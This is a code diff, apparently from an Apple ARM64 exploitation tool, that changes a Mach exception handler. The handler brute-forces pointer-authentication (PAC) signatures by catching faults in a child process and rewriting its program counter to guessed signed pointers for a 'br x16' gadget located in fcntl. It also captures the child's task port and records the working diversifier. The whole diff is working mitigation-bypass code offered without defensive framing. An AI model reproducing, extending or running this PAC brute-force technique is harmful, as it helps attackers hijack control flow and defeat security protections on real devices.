@@ -19,10 +19,20 @@
 #   define xpaci(x) (void)(x)
 #endif
 
+typedef struct {
+    uint64_t __x[29];       /* General purpose registers x0-x28 */
+    uint64_t __fp; /* Frame pointer x29 */
+    uint64_t __lr; /* Link register x30 */
+    uint64_t __sp; /* Stack pointer x31 */
+    uint64_t __pc; /* Program counter */
+    uint32_t __cpsr;        /* Current program status register */
+    uint32_t __flags; /* Flags describing structure format */
+} arm_thread_state64_internal;
+
 dispatch_semaphore_t sem_input_ready;
 dispatch_semaphore_t sem_output_ready;
 int num_exceptions_handled = 0;
-_STRUCT_ARM_THREAD_STATE64 *new_state;
+arm_thread_state64_internal *new_state;
 kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_port,
                                                          mach_port_t thread,
                                                          mach_port_t task,
@@ -39,27 +49,32 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         return KERN_FAILURE;
     }
     
-    const _STRUCT_ARM_THREAD_STATE64 *old_state = (const arm_thread_state64_t*)old_state_;
-    new_state = (_STRUCT_ARM_THREAD_STATE64 *)new_state_;
+    const arm_thread_state64_internal *old_state = (const arm_thread_state64_internal *)old_state_;
+    new_state = (arm_thread_state64_internal *)new_state_;
     memcpy(new_state, old_state, sizeof(arm_thread_state64_t));
     *new_state_cnt = old_state_cnt;
     
     uint64_t ptrL = code[1] & 0xFFFFFFFFF;
     uint64_t ptrR = (uint64_t)brX16Address & 0xFFFFFFFFF;
-    
     static uint64_t pacFailedCount = 0;
-    if (exception == EXC_BAD_ACCESS && codeCnt == 2 && code[0] == 1 && ptrL == ptrR) {
-        //printf("Handling PAC failure exception\n");
-        // PAC issue
+    static uint64_t pacBruteForcedPtr = 0;
+    static uint32_t pacBruteForcedDiversifier = 0;
+    if (exception == EXC_BAD_ACCESS && codeCnt == 2 && (code[0] == 1 || code[0] == 257) && (ptrL == ptrR || ptrL == 0xFFFFFFFFF)) {
+        uint32_t diversifier = new_state->__flags & 0xff000000;
+        if (!expectedDiversifier) {
+            // Attempt to brute-force PAC
+            pacBruteForcedPtr = ((uint64_t)brX16Address & 0xFFFFFFFFF) | (pacFailedCount << 40);
+            pacBruteForcedDiversifier = diversifier;
+            __darwin_arm_thread_state64_set_pc_presigned_fptr(*new_state, (void *)pacBruteForcedPtr);
+        } else {
+            //printf("diversifier: 0x%08x expected: 0x%08x\n", diversifier, expectedDiversifier);
+            pacBruteForcedPtr = brX16Address;
+        }
         pacFailedCount++;
         if ((pacFailedCount % 99999) == 0) {
             printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
-            printf("0x%016llx\n", ((uint64_t)brX16Address & 0xFFFFFFFFF) | (pacFailedCount << 40));
+            printf("0x%016llx\n", pacBruteForcedPtr);
         }
-        
-        uint64_t tmp = ((uint64_t)brX16Address & 0xFFFFFFFFF) | (pacFailedCount << 40);
-        
-        __darwin_arm_thread_state64_set_pc_presigned_fptr(*new_state, (void *)tmp);
         return KERN_SUCCESS;
         
 //        printf("PAC failure detected?\n");
@@ -69,15 +84,23 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     }
     
     printf("exception handler raise state - exception %d\n", exception);
+    if(pacBruteForcedPtr) {
+        printf("MAYBE PAC HAS BEEN BRUTE FORCED!\n");
+        printf("- ptr: 0x%016llx\n", pacBruteForcedPtr);
+        printf("- diversifier: 0x%08x\n", pacBruteForcedDiversifier);
+        brX16Address = pacBruteForcedPtr;
+        expectedDiversifier = pacBruteForcedDiversifier;
+    }
+    
     if (num_exceptions_handled == 0) {
         printf("got task port: %d\n", task);
         GlobalChildTaskPort = task;
         GlobalChildThreadPort = thread;
     } else {
         dispatch_semaphore_signal(sem_output_ready);
-        if ((old_state->__x[30] & 0xFFFFFF00) != 0x41414100 || wantsDetach) {
+        if ((old_state->__lr & 0xFFFFFF00) != 0x41414100 || wantsDetach) {
             wantsDetach = NO;
-            printf("Process might have crashed! unexpected lr value: 0x%llx\n", old_state->__x[30]);
+            printf("Process might have crashed! unexpected lr value: 0x%llx\n", old_state->__lr);
             printf("Registers:\n"
                    " x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx\n"
                    " x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx\n"
@@ -92,8 +115,8 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
                    old_state->__x[ 0], old_state->__x[ 1], old_state->__x[ 2], old_state->__x[ 3], old_state->__x[ 4], old_state->__x[ 5], old_state->__x[ 6], old_state->__x[ 7], old_state->__x[ 8], old_state->__x[ 9],
                    old_state->__x[10], old_state->__x[11], old_state->__x[12], old_state->__x[13], old_state->__x[14], old_state->__x[15], old_state->__x[16], old_state->__x[17], old_state->__x[18], old_state->__x[19],
                    old_state->__x[20], old_state->__x[21], old_state->__x[22], old_state->__x[23], old_state->__x[24], old_state->__x[25], old_state->__x[26], old_state->__x[27], old_state->__x[28],
-                   old_state->__x[29], old_state->__x[30], old_state->__x[31], old_state->__x[32], old_state->__cpsr);
-            return KERN_FAILURE;
+                   old_state->__fp, old_state->__lr, old_state->__pc, old_state->__sp, old_state->__cpsr);
+            //return KERN_FAILURE;
         }
     }
     
@@ -142,13 +165,11 @@ mach_port_t setup_exception_server(void) {
     // find br x16
     uint32_t *func = ((uint32_t *)ptrauth_strip((void *)fcntl, ptrauth_key_function_pointer));
     for (; *func != 0xd61f0200; func++) {}
-    brX16Address = (void *)ptrauth_sign_unauthenticated((void *)func, ptrauth_key_function_pointer, 0);
+    brX16Address = (uint64_t)ptrauth_sign_unauthenticated((void *)func, ptrauth_key_function_pointer, 0);
     
     printf("INFO of br x16 address:\n");
     printf("Unsigned: 0x%016llx\n", (uint64_t)func);
     printf("Signed:   0x%016llx\n", (uint64_t)brX16Address);
-    brX16Address = (void *)func;
-    printf("Signed2:  0x%016llx\n", (uint64_t)brX16Address);
     
     mach_port_t server_port;
     kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
